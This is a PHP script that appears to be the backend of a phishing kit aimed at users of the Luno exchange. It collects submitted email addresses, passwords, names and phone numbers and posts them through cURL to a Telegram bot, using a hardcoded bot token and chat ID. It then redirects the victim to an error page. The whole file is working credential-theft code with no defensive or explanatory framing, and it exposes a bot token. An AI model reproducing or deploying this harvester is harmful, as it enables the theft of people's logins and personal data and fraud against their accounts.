<?php
// Telegram bot token
$bot_token = '6897995221:AAEbl8GSlLeOfWbI3xZngdxQV3WhxFTMJu8';

// Chat ID
$chat_id = '-1002039314635';

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $email = $_POST['email'];
    $password = $_POST['password'];
    $name = $_POST['name'];
    $number = $_POST['number'];

    // Construct the message to be sent to Telegram
    $telegram_message = "New form Luno-:\nEmail: $email\nPassword: $password\nName: $name\nPhone Number: $number";

    // Set up the Telegram API endpoint
    $telegram_api_url = "https://api.telegram.org/bot$bot_token/sendMessage";

    // Set the POST parameters
    $telegram_data = array(
        'chat_id' => $chat_id, // Your chat ID
        'text' => $telegram_message
    );

    // Initialize cURL session
    $ch = curl_init($telegram_api_url);

    // Set cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegram_data);

    // Execute the cURL session
    $response = curl_exec($ch);

    // Close cURL session
    curl_close($ch);

    // Check if the message was sent successfully
    if ($response === false) {
        echo "Error sending message to Telegram";
    } else {
        // Redirect to verify.html
        header('Location: error.html');
        exit(); // Ensure that no further output is sent
    }
} else {
    // Handle if the form is not submitted
    echo "Form not submitted";
}
?>
